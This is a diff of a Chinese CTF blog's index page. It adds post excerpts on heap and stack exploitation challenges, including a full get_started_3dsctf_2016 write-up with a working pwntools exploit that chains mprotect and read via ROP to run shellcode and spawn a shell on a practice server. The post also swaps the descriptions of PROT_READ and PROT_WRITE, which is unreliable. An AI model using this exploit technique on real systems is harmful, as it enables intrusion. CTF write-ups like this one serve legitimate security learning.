@@ -156,6 +156,178 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-babyheap_0ctf_2017 ——堆入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路:"></a>主要思路:</h2><ol>
+<li>fastbin attack </li>
+<li>unsortedbin attack 泄露libc地址 </li>
+<li>malloc_hook劫持程序流<br><img src="https://img-blog.csdnimg.cn/20210213003704269.png" alt="在这里插入图片描述"><br>这个函数有4个功能
+        
+          <a class="article-more-a" href="/2021/02/13/babyheap_0ctf_2017%20%E2%80%94%E2%80%94%E5%A0%86%E5%85%A5%E9%97%A8/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/13/babyheap_0ctf_2017%20%E2%80%94%E2%80%94%E5%A0%86%E5%85%A5%E9%97%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-not_the_same_3dsctf_2016的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>32位程序<br>看看函数主题<br><img src="https://img-blog.csdnimg.cn/2021020616085466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>32位ida载入，shift+f12查看程序里的字符串，发现flag.txt
+        
+          <a class="article-more-a" href="/2021/02/06/not_the_same_3dsctf_2016%E7%9A%84wp/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/06/not_the_same_3dsctf_2016%E7%9A%84wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-get_started_3dsctf_2016的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一开始看见这个题，还挺开心<br><img src="https://img-blog.csdnimg.cn/20210203223754129.png" alt="在这里插入图片描述"><br>这是一个栈溢出，而且很简单</p>
+<p>不过我们发现写的exp本地能通，但是远程过不了</p>
+<p>这是因为.bss段的权限受限</p>
+<p>但是有这么一个函数，mprotect，我们先来学习一下。</p>
+<p>int mprotect(const void *start, size_t len, int prot);</p>
+<p>第一个参数填的是一个地址，是指需要进行操作的地址。</p>
+<p>第二个参数是地址往后多大的长度。</p>
+<p>第三个参数的是要赋予的权限。</p>
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<p>嗯。。。还是上面这一句话讲的明白…</p>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
+<p>1）PROT_READ：表示内存段内的内容可写；</p>
+<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
+<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
+<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
+<p>prot=7 是可读可写可执行</p>
+<p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.</span><br><span class="line">首先按先说一下mprotect函数:原型如下</span><br><span class="line"><span class="built_in">int</span> mprotect(void *addr, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line">addr 内存启始地址</span><br><span class="line"><span class="built_in">len</span>  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br><span class="line">要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或</span><br><span class="line">$ ./ get_started_3dsctf_2016 &amp;</span><br><span class="line">$ cat /proc/[you_pid]/maps 查看内存区域</span><br><span class="line">可以查看到,内存可读可写的地址为: <span class="number">0x80EB000</span> ,所以我们对该内存进行增加一个权限</span><br></pre></td></tr></table></figure>
+<p>在我们修改权限时要在ret后面压一个返回地址</p>
+<p>为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令<br>为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈<br>完好.<br>ret_addr2 即为执行完mprotect函数即弹出栈后的返回地址.我们也就可以再次利用栈的ret来控制eip,<br>即为下一个函数read的地址.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop esi</span></span><br><span class="line"><span class="string">pop edi</span></span><br><span class="line"><span class="string">pop ebp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">mem_addr = <span class="number">0x80EB000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload_01 = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload_01 += p32(mprotect_addr)</span><br><span class="line">payload_01 += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload_01 += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload_01 += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数</span></span><br><span class="line">payload_01 += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取</span></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload_01 += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload_01 += p32(mem_addr)   <span class="comment">#执行完read后ret esi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">payload_sh = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>具体过程可以看看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyxf/p/12113401.html">这</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/03/get_started_3dsctf_2016%E7%9A%84wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-关于libc泄露的有感而发---32位与64位区别" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -479,158 +651,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/01/23/int_overflow%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-guess_num的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>这题很有趣（<del>难</del> ）<br>放Linux康康<br><img src="https://img-blog.csdnimg.cn/20210122212622376.png" alt="在这里插入图片描述"></p>
-<p>好家伙保护直接加满了，这是个64位程序，放进ida64康康
-        
-          <a class="article-more-a" href="/2021/01/22/guess_num%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/22/guess_num%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-wp3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这题比较有趣（<del>难</del> ）<br>放linux<br><img src="https://img-blog.csdnimg.cn/20210121225321882.png" alt="在这里插入图片描述"><br>这是个32位，没有金丝雀<br>那么放进ida32康康
-        
-          <a class="article-more-a" href="/2021/01/21/wp3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/21/wp3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-wp2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a><strong><em>hello_pwn</em></strong></h1><p>老惯例放进Linux康康</p>
-<p><img src="https://img-blog.csdnimg.cn/20210121223341392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可见是个64位，且没有金丝雀（<del>狂喜</del> ）<br>放进ida64康康
-        
-          <a class="article-more-a" href="/2021/01/21/wp2/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/21/wp2/">展开全文 >></a>
         </p>
       
 
